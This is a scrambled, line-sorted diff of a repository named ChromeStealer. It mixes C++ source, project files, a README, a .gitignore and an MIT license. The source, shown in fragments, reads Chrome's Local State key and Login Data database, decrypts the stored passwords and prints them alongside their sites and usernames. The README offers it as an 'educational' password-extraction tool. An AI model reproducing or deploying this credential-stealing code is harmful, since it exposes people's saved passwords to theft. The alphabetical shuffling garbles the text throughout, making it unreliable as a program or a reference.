@@ -1,0 +1,914 @@
+    
+     
+        continue
+      </AdditionalDependencies>
+      </AdditionalLibraryDirectories>
+      <AdditionalDependencies>
+      <AdditionalLibraryDirectories>
+      <Configuration>Debug</Configuration>
+      <Configuration>Release</Configuration>
+      <ConformanceMode>true</ConformanceMode>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <Extensions>cpp
+      <Extensions>h
+      <Extensions>rc
+      <Filter>Header Files</Filter>
+      <Filter>Source Files</Filter>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <OptimizeReferences>true</OptimizeReferences>
+      <Platform>Win32</Platform>
+      <Platform>x64</Platform>
+      <PreprocessorDefinitions>NDEBUG
+      <PreprocessorDefinitions>WIN32
+      <PreprocessorDefinitions>_DEBUG
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+      <SDLCheck>true</SDLCheck>
+      <SubSystem>Console</SubSystem>
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <WarningLevel>Level3</WarningLevel>
+      BYTE
+      DATA_BLOB decryptionKey = decryptKey(encryptedKey)
+      LocalFree(decryptionKey.pbData)
+      decrypted[passwordSize - (IV_SIZE 
+      else {
+      free(Password)
+      if (Password == NULL) {
+      if (passwordSize <= (IV_SIZE 
+      if (passwordSize >= (IV_SIZE 
+      passwordBlob != NULL 
+      return EXIT_FAILURE
+      std::string encryptedKey = getEncryptedKey(localStatePath)
+      std::wstring localStatePath = FindLocalState()
+      std::wstring loginDataPath = FindLoginData()
+      unsigned char decrypted[1024]
+      unsigned char iv[IV_SIZE]
+      usernameValue != NULL 
+      }
+    </ClCompile>
+    </ClInclude>
+    </Filter>
+    </Link>
+    </ProjectConfiguration>
+    <CharacterSet>Unicode</CharacterSet>
+    <ClCompile>
+    <ConfigurationType>Application</ConfigurationType>
+    <Keyword>Win32Proj</Keyword>
+    <Link>
+    <PlatformToolset>v143</PlatformToolset>
+    <ProjectGuid>{c7c8b6fb-4e59-494e-aeeb-40cf342a7e88}</ProjectGuid>
+    <RootNamespace>ChromeStealer</RootNamespace>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <VCProjectVersion>17.0</VCProjectVersion>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
+    LocalFree(DataOutput.pbData)
+    RESET  // Reset text color
+    RegCloseKey(hKey)
+    break
+    cd ChromeStealer
+    const unsigned char
+    const void
+    decrypted[decrypted_len] = '
+    else {
+    git clone https://github.com/BernKing/ChromeStealer.git
+    if (!DeleteFileW(copyLoginDataPath.c_str())) {
+    if (IsChromeInstalled()) {
+    if (originUrl != NULL 
+    return
+    return EXIT_FAILURE
+    return false
+    return openingStatus
+    return true
+    return {}
+    sqlite3_close(loginDataBase)
+    vcpkg install libsodium jsoncpp sqlite3
+    }
+   Y  
+   __
+   ___________
+  // Open the registry key for Chrome's installation path.
+  //CSIDL_PROFILE macro for USER PROFILE
+  /__
+  </ImportGroup>
+  </ItemDefinitionGroup>
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  <br />
+  <br/>
+  <h1>ChromeStealer</h1>
+  <p><i>ChromeStealer is a tool for educational purposes to demonstrate how to extract and decrypt stored passwords from Google Chrome on a Windows system using C/C
+  DATA_BLOB DataInput
+  DATA_BLOB DataOutput
+  DWORD decodedBinarySize = 0
+  DataInput.cbData = static_cast<DWORD>(decodedBinaryData.size())
+  DataInput.pbData = decodedBinaryData.data()
+  HKEY hKey
+  WCHAR localStatePath[MAX_PATH]
+  WCHAR loginDataPath[MAX_PATH]
+  WCHAR userProfile[MAX_PATH]
+  ___/
+  ___/   /        
+  ___/ / __ 
+  case 1:
+  case 2:
+  const char
+  default:
+  displayMenu()
+  else {
+  file.close()
+  if (!CryptUnprotectData(
+  if (!DeleteFileW(copyLoginDataPath.c_str())) {
+  if (!SUCCEEDED(result)) {
+  if (!file.is_open()) {
+  if (decodedBinaryData.size() < 5) {
+  if (decodedBinarySize == 0) {
+  if (encrypted_key.empty()) {
+  if (itEncryptedKey == itOsEncrypt.value().end()) {
+  if (itOsEncrypt == localState.end() 
+  if (lRes == ERROR_SUCCESS) {
+  if (openingStatus != SQLITE_DONE) {
+  if (openingStatus != SQLITE_OK) {
+  if (openingStatus) {
+  if (result != 0) {
+  if (sodium_init() < 0) {
+  int choice = 0
+  int openingStatus = 0
+  int result = crypto_aead_aes256gcm_decrypt(
+  json localState = json::parse(file)
+  printf(YELLOW  // Set text color to purple
+  return DataOutput
+  return EXIT_FAILURE
+  return EXIT_SUCCESS
+  return encryptedKey
+  return std::wstring(localStatePath)
+  return std::wstring(loginDataPath)
+  sqlite3
+  sqlite3_close(loginDataBase)
+  sqlite3_finalize(stmt)
+  sqlite3_stmt
+  std::ifstream file(localStatePath)
+  std::string encryptedKey = itEncryptedKey.value()
+  std::string string_converted_path = converter.to_bytes(copyLoginDataPath)
+  std::vector<BYTE> decodedBinaryData(decodedBinarySize)
+  std::wstring copyLoginDataPath = loginDataPath
+  switch (choice) {
+  unsigned long long decrypted_len
+  using convert_type = std::codecvt_utf8<wchar_t>
+  while ((openingStatus = sqlite3_step(stmt)) == SQLITE_ROW) {
+ !itOsEncrypt.value().is_object()) {
+ !tools/packages.config
+ (IV_SIZE 
+ (https://github.com/github/gitignore/pull/1529
+ (https://github.com/github/gitignore/pull/2483
+ .NET Core
+ /     
+ 3))
+ 3)) {
+ 3)] = '
+ ASP.NET Scaffolding
+ Acknowledgements
+ AxoCover is a Code Coverage Tool
+ Azure Stream Analytics local run output
+ Backup 
+ Backup folder for Package Reference Convert tool in Visual Studio 2017
+ BeatPulse healthcheck temp database
+ Benchmark Results
+ BizTalk build output
+ Build Results of an ATL Project
+ Build results
+ Business Intelligence projects
+ Cake - Uncomment if you are using it
+ Chutzpah Test files
+ Click-Once directory
+ CodeRush personal settings
+ Convert binary document formats to text before diffing them. This feature
+ Dependencies
+ Disclaimer
+ DocProject is a documentation generator add-in
+ DotCover is a Code Coverage Tool
+ FAKE - F
+ Files built by Visual Studio
+ Files/
+ Fody - auto-generated XML schema
+ Full Write-Up
+ Get latest from https://github.com/github/gitignore/blob/main/VisualStudio.gitignore
+ GhostDoc plugin setting file
+ Guidance Automation Toolkit
+ Including strong name files can present a security risk
+ Installation
+ Installshield output folder
+ Ionide (cross platform F
+ JetBrains Rider
+ License
+ Local History for Visual Studio
+ Local History for Visual Studio Code
+ MFractors (Xamarin productivity tool) working folder
+ MSBuild Binary and Structured Log
+ MSTest test Results
+ Make
+ Merging from the command prompt will add diff markers to the files if there
+ Microsoft Azure Build Output
+ Microsoft Azure Emulator
+ Microsoft Azure Web App publish settings. Comment the next line if you want to
+ Microsoft Fakes
+ MightyMoose
+ Mono auto generated files
+ NCrunch
+ NUnit
+ NVidia Nsight GPU debugger configuration file
+ Node.js Tools for Visual Studio
+ Note: This is only used by command line
+ NuGet Packages
+ NuGet Symbol Packages
+ NuGet v3's project.json files produces more ignorable files
+ OpenCover UI analysis results
+ Others
+ Overview
+ Paket dependency manager
+ Password = (BYTE
+ Publish Web Output
+ Python Tools for Visual Studio (PTVS)
+ RIA/Silverlight projects
+ ReSharper is a .NET coding add-in
+ SQL Server files
+ Set default behavior for command prompt diff.
+ Set default behavior to automatically normalize line endings.
+ Set the merge driver for project and solution files
+ StyleCop
+ TFS 2012 Local Workspace
+ Tabs Studio
+ TeamCity is a build add-in
+ Telerik's JustMock configuration file
+ The packages folder can be ignored because of Package Restore
+ This is need for earlier builds of msysgit that does not have it on by
+ Uncomment if necessary however generally it will be regenerated when needed
+ Uncomment if you have tasks that create the project's static files in wwwroot
+ Usage
+ User-specific files
+ User-specific files (MonoDevelop/Xamarin Studio)
+ VS Code files for those working on multiple tools
+ VS Code tools) working folder
+ Visual C
+ Visual Studio 2015/2017 cache/options directory
+ Visual Studio 2017 auto generated files
+ Visual Studio 6 auto-generated project file (contains which files were open etc.)
+ Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
+ Visual Studio 6 build log
+ Visual Studio 6 technical files
+ Visual Studio 6 workspace and project file (working project files containing files to include in project)
+ Visual Studio 6 workspace options file
+ Visual Studio History (VSHistory) files
+ Visual Studio LightSwitch build output
+ Visual Studio Trace Files
+ Visual Studio Version 17
+ Visual Studio cache files
+ Visual Studio code coverage results
+ Visual Studio profiler
+ Web workbench (sass)
+ Windows Installer files from build outputs
+ Windows Store app package directories and files
+ _/ __ 
+ because we have git 
+ behavior for image files
+ blacklistedByUser != 1) {
+ but database connection strings (with potential passwords) will be unencrypted
+ but keep track of directories ending in .cache
+ cache files
+ decrypted)
+ decrypted) {
+ default for csharp files.
+ diff behavior for common document formats
+ encrypted_key)
+ encrypted_key) {
+ entries below.
+ file extensions to fail to load in VS. An alternative would be to treat
+ files ending in .cache can be ignored
+ files generated by popular Visual Studio add-ons.
+ image files are treated as binary by default.
+ in these scripts will be unencrypted
+ is only available from the command line. Turn it on by uncommenting the 
+ localStatePath)
+ localStatePath) {
+ loginDataBase = nullptr
+ originUrl[0] != '
+ report files from converting an old project file
+ stmt = nullptr
+ text=auto
+ the diff markers are never inserted). Diff markers may cause the following 
+ these files as binary and thus will always conflict and require user
+ tools/
+ usernameValue[0] != '
+ versions either didn't work or didn't satisfy me enough. I hope that the write-up helps other people who were in the same position as me.
+!.axoCover/settings.json
+!.vscode/extensions.json
+!.vscode/launch.json
+!.vscode/settings.json
+!.vscode/tasks.json
+"        memcpy(iv, (unsigned char"
+"        warn(""Memory allocation failed"")"
+"        warn(""Password size too small to generate IV"")"
+"        warn(""Password size too small"")"
+"      decryptPassword(Password, passwordSize - (IV_SIZE "
+"      info(""----------------------------------"")"
+"      int parser = loginDataParser(loginDataPath, decryptionKey)"
+"      memcpy(Password, (unsigned char"
+"      okay(""Google Chrome is installed."")"
+"      okay(""Origin URL: %s"", originUrl)"
+"      okay(""Password: %s"", decrypted)"
+"      okay(""Username Value: %s"", usernameValue)"
+"      warn(""Error deleting the file. Error: %ld"", GetLastError())"
+"      warn(""Google Chrome is not installed. Shutting down."")"
+"    ""                                Made by Bernking"
+"    ""                            Check my blog: https://bernking.github.io/"
+"    ""                           For educational purposes only"
+"    ""                        Check my GitHub: https://github.com/BernKing"
+"    ""        "
+"    "" "
+"    """
+"    ""/    "
+"    ""_________ .__                                    _________ __                .__        "
+"    ""________________________________________________________________________________________"
+"    0, KEY_READ, "
+"    <ClCompile Include=""ChromeStealer.cpp"" />"
+"    <ClCompile Include=""ChromeStealer.cpp"">"
+"    <ClInclude Include=""ChromeStealer.h"" />"
+"    <ClInclude Include=""ChromeStealer.h"">"
+"    <Filter Include=""Header Files"">"
+"    <Filter Include=""Resource Files"">"
+"    <Filter Include=""Source Files"">"
+"    <Import Project=""$(UserRootDir)"
+"    <ProjectConfiguration Include=""Debug"
+"    <ProjectConfiguration Include=""Release"
+"    L""SOFTWARE"
+"    NULL, 0,"
+"    NULL,"
+"    ciphertext, ciphertext_len,"
+"    decrypted, "
+"    fprintf(stderr, ""Decryption failed"
+"    fprintf(stderr, ""Failed to initialize libsodium"
+"    int blacklistedByUser = sqlite3_column_int(stmt, 3)"
+"    int passwordSize = sqlite3_column_bytes(stmt, 2)"
+"    iv, key"
+"    okay(""Exiting the program."")"
+"    return """""
+"    return L"""""
+"    warn(""Can't open database: %s"", sqlite3_errmsg(loginDataBase))"
+"    warn(""Decoded binary data size is too small."
+"    warn(""Decoded binary size is zero."")"
+"    warn(""Error copying the file. Error: %ld"", GetLastError())"
+"    warn(""Error decoding Base64 string first step. Error: %ld"
+"    warn(""Error decoding Base64 string second step. Error: %ld"
+"    warn(""Error decrypting data. Error %ld"", GetLastError())"
+"    warn(""Error deleting the file. Error: %ld"", GetLastError())"
+"    warn(""Error getting user path. Error: %ld"", GetLastError())"
+"    warn(""Error opening the file. Error: %ld"", GetLastError())"
+"    warn(""Input string is empty."")"
+"    warn(""Invalid choice. Exiting the program."")"
+"    warn(""Key encrypted_key not found or not an object"")"
+"    warn(""Key os_crypt not found or not an object."")"
+"    warn(""SQL error or end of data: %s"", sqlite3_errmsg(loginDataBase))"
+"    warn(""SQL error: %s"", sqlite3_errmsg(loginDataBase))"
+"  // If the key exists, Chrome is installed."
+"  //info(""The decrypted data is: %s"", DataOutput.pbData)"
+"  //okay(""Value at key encrypted_key: %s"", encryptedKey.c_str())"
+"  <Import Project=""$(VCTargetsPath)"
+"  <ImportGroup Label=""ExtensionSettings"">"
+"  <ImportGroup Label=""ExtensionTargets"">"
+"  <ImportGroup Label=""PropertySheets"" Condition=""'$(Configuration)"
+"  <ImportGroup Label=""Shared"">"
+"  <ItemDefinitionGroup Condition=""'$(Configuration)"
+"  <ItemGroup Label=""ProjectConfigurations"">"
+"  <PropertyGroup Condition=""'$(Configuration)"
+"  <PropertyGroup Label=""Globals"">"
+"  <PropertyGroup Label=""UserMacros"" />"
+"  HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile)"
+"  LONG lRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,"
+"  _snwprintf_s(localStatePath, MAX_PATH, _TRUNCATE, L""%s"
+"  _snwprintf_s(loginDataPath, MAX_PATH, L""%s"
+"  auto itEncryptedKey = itOsEncrypt.value().find(""encrypted_key"")"
+"  auto itOsEncrypt = localState.find(""os_crypt"")"
+"  copyLoginDataPath.append(L""a"")"
+"  decodedBinaryData.erase(decodedBinaryData.begin(), decodedBinaryData.begin() "
+"  if (!CopyFileW(loginDataPath.c_str(), copyLoginDataPath.c_str(), FALSE)) {"
+"  if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, NULL, "
+"  if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, decodedBinaryData.data(), "
+"  okay(""Executed SQL Query."")"
+"  okay(""Full path to Local State file: %ls"", localStatePath)"
+"  okay(""Full path to Login Data file: %ls"", loginDataPath)"
+"  okay(""Key encrypted_key found"")"
+"  okay(""Key os_crypt found."")"
+"  openingStatus = sqlite3_open_v2(string_converted_path.c_str(), "
+"  openingStatus = sqlite3_prepare_v2(loginDataBase, sql, -1, "
+"  printf("""
+"  printf(""1. Proceed with decryption"
+"  printf(""2. Quit"
+"  printf(""Enter your choice: "")"
+"  printf(""Menu:"
+"  scanf_s(""%d"", "
+"  std::wstring_convert<convert_type, wchar_t> converter"
+"  warn(""This program only runs on Windows systems."
+" 3), decryptionKey.pbData, iv, decrypted)"
+" 3), passwordSize - (IV_SIZE "
+" 3, IV_SIZE)"
+" Coverlet is a free, cross platform Code Coverage Tool"
+" Ignore Visual Studio temporary files, build results, and"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" are conflicts (Merging from VS is not affected by the settings below, in VS"
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" ciphertext, size_t ciphertext_len, unsigned char"
+" except build/, which is used as an MSBuild target."
+" intervention with every merge. To do so, just uncomment the entries below"
+" iv, unsigned char"
+" key, unsigned char"
+" loginDataPath, DATA_BLOB decryptionKey) {"
+" loginDataPath, DATA_BLOB decryptionKey)"
+" originUrl = sqlite3_column_text(stmt, 0)"
+" passwordBlob = sqlite3_column_blob(stmt, 2)"
+" sql = ""SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins"""
+" to a newer Visual Studio version. Backup files are not needed,"
+" usernameValue = sqlite3_column_text(stmt, 1)"
+". <br/>Created by <a href=""https://x.com/bernKing20"">@bernKing20</a>.</i></p>"
+"// @return True if Chrome is installed, false otherwise."
+"// This function opens the Login Data SQLite database, executes a query to retrieve login"
+"// credentials, and decrypts the passwords using the provided decryption key."
+"033[0m"""
+"033[32m"""
+"033[33m"""
+"033[35m"""
+"<Project DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<div align=""center"">"
+"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER"
+"DataInput, NULL, NULL, NULL, NULL, 0, "
+"For a detailed explanation of the project, visit the full write-up at [my blog](https://bernking.github.io//2024/chrome-stealer/)."
+"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,"
+"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,"
+"Local State"", userProfile)"
+"Login Data"", userProfile)"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.Cpp.$(Platform).user.props"" Condition=""exists('$(UserRootDir)"
+"Microsoft.Cpp.$(Platform).user.props')"" Label=""LocalAppDataPlatform"" />"
+"Microsoft.Cpp.Default.props"" />"
+"Microsoft.Cpp.props"" />"
+"Microsoft.Cpp.targets"" />"
+"Permission is hereby granted, free of charge, to any person obtaining a copy"
+"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""ChromeStealer"", ""ChromeStealer.vcxproj"", ""{C7C8B6FB-4E59-494E-AEEB-40CF342A7E88}"""
+"THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR"
+"Win32"">"
+"Win32'"" Label=""Configuration"">"
+"Win32'"">"
+"] "" RESET msg """
+"chrome.exe"","
+"copies of the Software, and to permit persons to whom the Software is"
+"decodedBinarySize, NULL, NULL)) {"
+"decrypted_len,"
+"define GREEN   """
+"define PURPLE  """
+"define RESET   """
+"define YELLOW  """
+"define info(msg, ...) printf(YELLOW ""[i] "" RESET msg """
+"define okay(msg, ...) printf(GREEN ""["
+"define warn(msg, ...) printf(PURPLE ""[-] "" RESET msg """
+"furnished to do so, subject to the following conditions:"
+"in the Software without restriction, including without limitation the rights"
+"include ""ChromeStealer.h"""
+"loginDataBase, SQLITE_OPEN_READONLY, nullptr)"
+"n"", "
+"n"", GetLastError())"
+"of this software and associated documentation files (the ""Software""), to deal"
+"pragma comment(lib, ""Advapi32.lib"")"
+"pragma comment(lib, ""Crypt32.lib"")"
+"pragma comment(lib, ""Shell32.lib"")"
+"stmt, nullptr)"
+"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell"
+"x64"">"
+"x64'"" Label=""Configuration"">"
+"x64'"">"
+"xml version=""1.0"" encoding=""utf-8"""
+$(Platform)'=='Debug
+$(Platform)'=='Release
+$tf/
+%(PreprocessorDefinitions)</PreprocessorDefinitions>
+(  <_> )  Y Y  
+)malloc(passwordSize - (IV_SIZE 
+)passwordBlob 
+- [Bb]ackup ([0-9]).rdl
+- [Bb]ackup ([0-9][0-9]).rdl
+- [Bb]ackup.rdl
+- [How to Hack Chrome Password with Python](https://ohyicong.medium.com/how-to-hack-chrome-password-with-python-1bedc167be3d)
+- [libsodium](https://libsodium.gitbook.io/doc/)
+- [nlohmann/json](https://github.com/nlohmann/json)
+- [sqlite3](https://www.sqlite.org/index.html)
+.DOC   diff=astextplain
+.DOCX  diff=astextplain
+.DOT   diff=astextplain
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.DotSettings.user
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.PDF   diff=astextplain
+.RTF   diff=astextplain
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.appx
+.appxbundle
+.appxupload
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cab
+.cachefile
+.code-workspace
+.coverage
+.coveragexml
+.cr/personal
+.cs     diff=csharp
+.csproj    merge=binary
+.dbmdl
+.dbproj    merge=binary
+.dbproj.schemaview
+.doc   diff=astextplain
+.docx  diff=astextplain
+.dot   diff=astextplain
+.dotCover
+.dsp
+.dsw
+.e2e
+.fake/
+.fsproj    merge=binary
+.gif   binary
+.gpState
+.hhc
+.hhk
+.hhp
+.history/
+.htm
+.ilk
+.info
+.iobj
+.ionide/
+.ipdb
+.jfm
+.jmconfig
+.jpg   binary
+.json
+.ldf
+.local.xml
+.localhistory/
+.log
+.lsproj    merge=binary
+.mdf
+.meta
+.mfractor/
+.mm.
+.modelproj merge=binary
+.msi
+.msix
+.msm
+.msp
+.ncb
+.ndf
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.paket/paket.exe
+.pch
+.pdb
+.pdf   diff=astextplain
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.png   binary
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl.data
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.rtf   diff=astextplain
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.sln       merge=binary
+.sln.docstates
+.sln.iml
+.snk
+.snupkg
+.sqlproj   merge=binary
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tlog
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbp
+.vbproj    merge=binary
+.vbw
+.vcproj    merge=binary
+.vcxproj   merge=binary
+.vs/
+.vscode/
+.vshistory/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.wixproj   merge=binary
+.wwaproj   merge=binary
+.xml
+.xsd.cs
+/     
+/        
+/          
+/           
+/                   
+/  _ 
+/ __ 
+// @param ciphertext The encrypted password.
+// @param ciphertext_len The length of the encrypted password.
+// @param decrypted The buffer to store the decrypted password.
+// @param decryptionKey The key used to decrypt the login data.
+// @param encrypted_key The encrypted key as a Base64-encoded string.
+// @param encrypted_key The encrypted key as a string.
+// @param iv The initialization vector used for decryption.
+// @param key The key used for decryption.
+// @param localStatePath The path to the Local State file.
+// @param loginDataPath The path to the Login Data file.
+// @return An integer indicating success (0) or failure (non-zero).
+// @return The decrypted key as a DATA_BLOB structure.
+// @return The encrypted key as a string.
+// @return The path to the Local State file as a wide string.
+// @return The path to the Login Data file as a wide string.
+// ANSI escape codes for colors
+// Checks if Google Chrome is installed on the machine.
+// Decrypts a password using the provided key and initialization vector (IV).
+// Decrypts an encrypted key using the CryptUnprotectData function.
+// Decrypts an encrypted key.
+// Finds the path to the Local State file.
+// Finds the path to the Login Data file.
+// Link against the required libraries
+// Parses the Login Data file to extract and decrypt login credentials.
+// Parses the Login Data file to extract login credentials.
+// Retrieves the encrypted key from the Local State file.
+// This function decodes a Base64-encoded string and decrypts it to retrieve
+// This function queries the Windows Registry to check if the registry key
+// This function reads the Local State file in JSON format and extracts the
+// This function retrieves the user's profile path and constructs the path to
+// This function uses the libsodium library to decrypt the ciphertext.
+// encrypted key used by Google Chrome.
+// for Chrome's installation path exists.
+// the Local State file used by Google Chrome.
+// the Login Data file used by Google Chrome.
+// the original key.
+//@turn a bool stating if it is installed or not.
+//Check if WIndows system
+//Checks if Chrome is installed in the local machine.
+//using namespace std
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+1. Build the project in Visual Studio 2022.
+1. Clone the repository:
+1. [libsodium](https://libsodium.gitbook.io/doc/)
+2. Install the dependencies using vcpkg:
+2. Run the executable. Follow the on-screen instructions to extract and decrypt stored passwords from Google Chrome.
+2. [nlohmann/json](https://github.com/nlohmann/json)
+3. Open the project in Visual Studio 2022.
+3. [sqlite3](https://www.sqlite.org/index.html)
+</Project>
+</div>
+ASALocalRun/
+App Paths
+AppData
+AppPackages/
+AutoTest.Net/
+Backup
+BenchmarkDotNet.Artifacts/
+BundleArtifacts/
+Chrome
+ChromeStealer was created because existing write-ups and C/C
+ClientBin/
+Copyright (c) 2024 BernKing
+CurrentVersion
+DATA_BLOB decryptKey(const std::string
+DataOutput)) {
+Debug
+Default
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+EndGlobal
+EndGlobalSection
+EndProject
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+FakesAssemblies/
+FodyWeavers.xsd
+Generated
+Generated_Code/
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+Google
+HideSolutionNode = FALSE
+Local
+MIT License
+Microsoft
+MigrationBackup/
+MinimumVisualStudioVersion = 10.0.40219.1
+NDEBUG
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+OpenCover/
+Package.StoreAssociation.xml
+PublishScripts/
+Release
+SOFTWARE.
+ScaffoldingReadMe.txt
+ServiceFabricBackup/
+SolutionGuid = {9B2B5CA5-4922-42FF-A48F-A44EEDB866EE}
+StyleCopReport.xml
+TestResult.xml
+The above copyright notice and this permission notice shall be included in all
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+This project uses [vcpkg](https://vcpkg.io/) to manage dependencies. Ensure you have vcpkg installed and integrated with Visual Studio 2022.
+This project uses the following libraries:
+This tool is intended for educational purposes only. Misuse of this tool can lead to legal consequences. Always ensure you have permission before using it on any system. The author is not responsible for any misuse of this tool.
+UpgradeLog
+User Data
+VisualStudioVersion = 17.8.34330.188
+Win32
+Windows
+[Aa][Rr][Mm]/
+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Ll]ogs/
+[Oo]bj/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[Ww][Ii][Nn]32/
+_   ___ 
+_  __ 
+_  ____ _____  
+_/ __ 
+_CONSOLE
+_Chutzpah
+_DEBUG
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_UpgradeReport_Files/
+__  
+__VA_ARGS__)
+___  > /_______  /
+___  >__
+___  >____  /____/
+____/
+_____  
+______  /___
+_________  ____   _____   ____    /   _____//  
+__pycache__/
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+artifacts/
+asmx</Extensions>
+bld/
+bool IsChromeInstalled()
+bool IsChromeInstalled() {
+bower_components/
+choice)
+copies or substantial portions of the Software.
+coverage
+cppm
+crunch
+csx/
+define EXIT_FAILURE 1
+define EXIT_SUCCESS 0
+define IV_SIZE 12
+define MAX_LINE_LENGTH 1024
+dlldata.c
+ecf/
+else
+endif
+endif // _WIN32
+hKey)
+healthchecksdb
+ifdef _WIN32
+include <Shlobj.h>
+include <Windows.h>
+include <codecvt>
+include <fstream>
+include <locale>
+include <nlohmann/json.hpp>
+include <sodium/core.h>
+include <sodium/crypto_aead_aes256gcm.h>
+include <sqlite3.h>
+include <string>
+include <vector>
+include <wincrypt.h>
+int loginDataParser(const std::wstring
+int main() {
+ipch/
+issue-259490424)
+issuecomment-104372622)
+jpeg
+mfcribbon-ms</Extensions>
+mono_crash.
+nCrunchTemp_
+node_modules/
+nunit-
+orleans.codegen.cs
+paket-files/
+pragma once
+project.fragment.lock.json
+project.lock.json
+publish/
+rcf/
+resx
+std::string getEncryptedKey(const std::wstring
+std::wstring FindLocalState()
+std::wstring FindLocalState() {
+std::wstring FindLoginData()
+std::wstring FindLoginData() {
+tiff
+using json = nlohmann::json
+void decryptPassword(unsigned char
+void displayMenu() {
+wwwroot/
+x64 = Debug
+x64 = Release
+x64.ActiveCfg = Debug
+x64.ActiveCfg = Release
+x64.Build.0 = Debug
+x64.Build.0 = Release
+x64/
+x86 = Debug
+x86 = Release
+x86.ActiveCfg = Debug
+x86.ActiveCfg = Release
+x86.Build.0 = Debug
+x86.Build.0 = Release
+x86/
+xsd</Extensions>
+{C7C8B6FB-4E59-494E-AEEB-40CF342A7E88}.Debug
+{C7C8B6FB-4E59-494E-AEEB-40CF342A7E88}.Release
